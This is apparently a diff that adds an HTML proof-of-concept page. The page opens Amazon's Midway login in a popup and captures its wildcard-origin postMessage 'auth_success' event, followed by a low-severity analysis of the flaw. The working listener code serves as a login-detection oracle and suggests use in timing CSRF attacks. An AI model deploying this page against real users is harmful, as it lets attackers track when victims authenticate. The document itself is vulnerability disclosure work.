@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Midway Auth postMessage PoC</title>
+</head>
+<body>
+    <h1>Midway Auth postMessage Proof of Concept</h1>
+    <p>Click the button to open the Midway login page. After the user authenticates,
+       this page will receive a postMessage from the login window.</p>
+
+    <button id="openLogin">Open Midway Login</button>
+
+    <h2>Received Messages:</h2>
+    <pre id="output">(waiting for messages...)</pre>
+
+    <script>
+    // -----------------------------------------------------------------------
+    // STEP 1: Register a message event listener BEFORE opening the popup.
+    //
+    // The midway-auth login page calls:
+    //   window.opener.postMessage(r, "*")
+    //
+    // Because the targetOrigin is "*", ANY origin can receive this message.
+    // There is no check on who opened the window.
+    // -----------------------------------------------------------------------
+    window.addEventListener("message", function(event) {
+        // Log the origin that sent the message (should be midway-auth.amazon.com)
+        var output = document.getElementById("output");
+        output.textContent  = "=== postMessage received ===\n";
+        output.textContent += "Origin: " + event.origin + "\n";
+        output.textContent += "Data: " + JSON.stringify(event.data, null, 2) + "\n";
+        output.textContent += "Timestamp in data: " + event.data.timestamp + "\n";
+        output.textContent += "Event type in data: " + event.data.event_type + "\n";
+        output.textContent += "\n";
+        output.textContent += "=== Analysis ===\n";
+        output.textContent += "Fields received: " + Object.keys(event.data).join(", ") + "\n";
+        output.textContent += "Contains auth tokens? NO - only event_type and timestamp\n";
+
+        console.log("postMessage event object:", event);
+        console.log("event.data:", event.data);
+        console.log("event.origin:", event.origin);
+    });
+
+    // -----------------------------------------------------------------------
+    // STEP 2: Open the Midway login page as a popup window.
+    //
+    // The `next` parameter controls where the user is redirected after login.
+    // The login page will set window.opener to THIS page's window object.
+    // -----------------------------------------------------------------------
+    document.getElementById("openLogin").addEventListener("click", function() {
+        // Open the login page. The ?next= parameter is the post-login redirect.
+        var loginWindow = window.open(
+            "https://midway-auth.amazon.com/login?next=/",
+            "midwayLogin",
+            "width=500,height=600"
+        );
+
+        // Note: We do NOT need to do anything else.
+        // After successful authentication, the login page's authenticationSuccess()
+        // function will call:
+        //   window.opener.postMessage({event_type: "auth_success", timestamp: Date.now()}, "*")
+        //
+        // Our message listener above will capture it.
+    });
+    </script>
+
+    <hr>
+    <h2>What This Demonstrates</h2>
+    <p>
+        The vulnerability is in <code>authenticationSuccess()</code> in the login JS:
+    </p>
+    <pre>
+function authenticationSuccess(e) {
+    showAuthSuccessScreen(e);
+    var r = {
+        event_type: "auth_success",
+        timestamp: Date.now()
+    };
+    lsTest() && localStorage.setItem("auth_event", JSON.stringify(r));
+    window.opener && window.opener.postMessage(r, "*");
+    // ...
+}
+    </pre>
+
+    <h3>Key Findings:</h3>
+    <ul>
+        <li><strong>postMessage targetOrigin is "*"</strong> - Any origin can receive the message.</li>
+        <li><strong>No opener origin check</strong> - The code only checks <code>window.opener</code>
+            exists (truthy check), NOT what origin opened it.</li>
+        <li><strong>Data sent (variable r) contains ONLY:</strong>
+            <code>{event_type: "auth_success", timestamp: Date.now()}</code></li>
+        <li><strong>NO tokens, session data, cookies, or user info are sent via postMessage.</strong></li>
+        <li><strong>Impact is LIMITED:</strong> An attacker page can detect WHEN a user successfully
+            authenticates (timing oracle), but does NOT receive any credentials or session tokens.</li>
+        <li><strong>localStorage cross-tab sync:</strong> The same event is also written to localStorage
+            with key "auth_event", enabling cross-tab detection of login success.</li>
+    </ul>
+
+    <h3>Severity Assessment:</h3>
+    <p>
+        <strong>Low severity.</strong> The postMessage with targetOrigin "*" is a CWE-345
+        (Insufficient Verification of Data Authenticity) issue, but the actual data leaked
+        is only a status event ("auth_success") and a timestamp. No secrets are transmitted.
+        The practical impact is limited to:
+    </p>
+    <ol>
+        <li>An attacker-controlled page can confirm that a user has successfully authenticated
+            to Midway (authentication oracle).</li>
+        <li>This could be used as a building block in a more complex attack chain
+            (e.g., timing when to attempt CSRF or session-riding attacks).</li>
+    </ol>
+</body>
+</html>
